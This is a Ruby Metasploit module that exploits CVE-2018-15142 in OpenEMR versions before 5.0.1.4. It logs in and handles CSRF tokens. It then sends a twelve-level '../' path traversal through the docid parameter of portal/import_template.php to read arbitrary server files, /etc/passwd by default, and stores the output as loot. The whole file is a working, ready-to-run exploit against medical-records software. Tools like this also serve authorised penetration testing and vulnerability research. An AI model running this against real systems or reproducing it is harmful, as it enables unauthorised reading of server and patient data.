class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'OpenEMR prior to 5.0.1.4 Authenticated Arbitrary File Read via import_template.php',
        'Description'    => %q{
          This module exploits an authenticated arbitrary file read vulnerability in OpenEMR
          versions prior to 5.0.1.4 (CVE-2018-15142). The portal import_template.php script
          passes the docid parameter directly to file_get_contents() when mode=get, allowing
          any authenticated user to read arbitrary server-side files via path traversal.
        },
        'Author'         => [
          'Joshua Fam',        # Original vulnerability discovery
          'AMENDER'            # Metasploit module
        ],
        'License'        => MSF_LICENSE,
        'References'     => [
          ['CVE', '2018-15142'],
          ['EDB', '45202']
        ],
        'DisclosureDate' => 'Aug 14, 2018',
        'Notes'          => {
          'Stability'   => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to OpenEMR', '/']),
        OptString.new('USERNAME', [true, 'The OpenEMR username', 'admin']),
        OptString.new('PASSWORD', [true, 'The OpenEMR password', '']),
        OptString.new('SITE', [true, 'The OpenEMR site identifier', 'default']),
        OptString.new('TARGETFILE', [true, 'The absolute path of the file to read', '/etc/passwd'])
      ]
    )
  end

  def run
    print_status("OpenEMR prior to 5.0.1.4 - Authenticated Arbitrary File Read (CVE-2018-15142)")
    print_status("Target: #{full_uri}")

    cookie = do_login
    unless cookie
      print_error("Authentication failed")
      return
    end

    print_good("Authentication successful")
    read_arbitrary_file(cookie)
  end

  def do_login
    print_status("Authenticating as '#{datastore['USERNAME']}'...")

    # First, get the login page to extract CSRF token if present
    login_uri = normalize_uri(target_uri.path, 'interface', 'login', 'login.php')

    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => login_uri,
      'vars_get'  => {
        'site' => datastore['SITE']
      }
    )

    unless res
      print_error("Connection failed while accessing login page")
      return nil
    end

    # Extract CSRF token if present
    csrf_token = nil
    if res.body =~ /csrf_token_form.*?value=["']([^"']+)["']/m
      csrf_token = ::Regexp.last_match(1)
      vprint_status("Found CSRF token: #{csrf_token}")
    end

    # Build authentication POST data
    post_data = {
      'new_login_session_management' => '1',
      'authProvider'                 => 'Default',
      'authUser'                     => datastore['USERNAME'],
      'clearPass'                    => datastore['PASSWORD'],
      'languageChoice'               => '1'
    }

    post_data['csrf_token_form'] = csrf_token if csrf_token

    # Perform authentication
    auth_uri = normalize_uri(target_uri.path, 'interface', 'main', 'main_screen.php')

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => auth_uri,
      'vars_get'  => {
        'auth' => 'login',
        'site' => datastore['SITE']
      },
      'vars_post' => post_data
    )

    unless res
      print_error("Connection failed during authentication")
      return nil
    end

    # Check for authentication failure markers
    fail_markers = ['login_screen.php?error=1', 'Invalid username or password']
    fail_markers.each do |marker|
      if res.body.include?(marker)
        print_error("Authentication failed: #{marker}")
        return nil
      end
    end

    # Extract session cookie
    cookie = res.get_cookies
    if cookie.nil? || cookie.empty?
      print_error("No session cookie received")
      return nil
    end

    cookie
  end

  def read_arbitrary_file(cookie)
    print_status("Reading file: #{datastore['TARGETFILE']}")

    # Build path traversal payload
    traversal = '../' * 12 + datastore['TARGETFILE'].sub(%r{^/}, '')
    vuln_uri = normalize_uri(target_uri.path, 'portal', 'import_template.php')

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => vuln_uri,
      'cookie'    => cookie,
      'vars_post' => {
        'mode'  => 'get',
        'docid' => traversal
      }
    )

    unless res
      print_error("Connection failed during file read")
      return
    end

    # Check for session rejection
    fail_markers = ['login_screen.php?error=1', 'Invalid username or password']
    fail_markers.each do |marker|
      if res.body.include?(marker)
        print_error("Session rejected or authentication required")
        return
      end
    end

    content = res.body

    if content.nil? || content.strip.empty?
      print_error("File not found or empty response")
      return
    end

    # Success - print file content
    print_good("File content:")
    print_line(content)

    # Store the loot
    loot_path = store_loot(
      'openemr.file',
      'text/plain',
      rhost,
      content,
      datastore['TARGETFILE'],
      'OpenEMR Arbitrary File Read'
    )
    print_good("File saved to: #{loot_path}")

    # Check for confirmation pattern
    if content.include?('root:x:0:0')
      print_good("CONFIRMED: CVE-2018-15142 exploitation successful!")
    end
  end

  def full_uri
    proto = ssl ? 'https' : 'http'
    port_str = (rport == 80 && !ssl) || (rport == 443 && ssl) ? '' : ":#{rport}"
    "#{proto}://#{rhost}#{port_str}#{target_uri.path}"
  end
end